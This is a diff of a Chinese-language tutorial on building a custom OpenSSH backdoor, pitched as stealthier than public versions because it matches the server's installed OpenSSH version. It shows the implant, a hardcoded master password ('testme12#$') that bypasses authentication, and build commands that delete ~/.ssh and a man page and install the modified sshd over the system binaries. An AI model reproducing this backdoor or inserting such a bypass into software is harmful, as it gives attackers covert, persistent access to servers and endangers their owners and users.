@@ -1,4 +1,4 @@
-# OpenSSH后门制作
+# 定制化OpenSSH后门
 
 网上关于OpenSSH的后门都是抄来抄去，普遍都是对某个早期版本的OpenSSH打patch进行的，这样的后门使用起来就是自己骗自己，隐蔽性不强，兼容度也极低。因此，花了一段时间研究怎么手工制作OpenSSH后门，这样的后门定制度高，与服务器上OpenSSH版本一致，隐蔽性也较强。
 
@@ -76,6 +76,7 @@ if (!strcmp(password, "testme12#$")) return 1;
 ### 编译安装
 
 ```shell
+
 apt-get install libpam0g-dev libselinux1-dev
 
 clear;rm -rf /usr/local/share/man/man5/authorized_keys.5;rm -rf ~/.ssh;make clean; ./configure --with-zlib --with-ssl-dir --with-pam --bindir=/usr/bin --sbindir=/usr/sbin --sysconfdir=/etc/ssh --with-md5-passwords --with-selinux --with-privsep-path=/run/sshd ; make && make install 
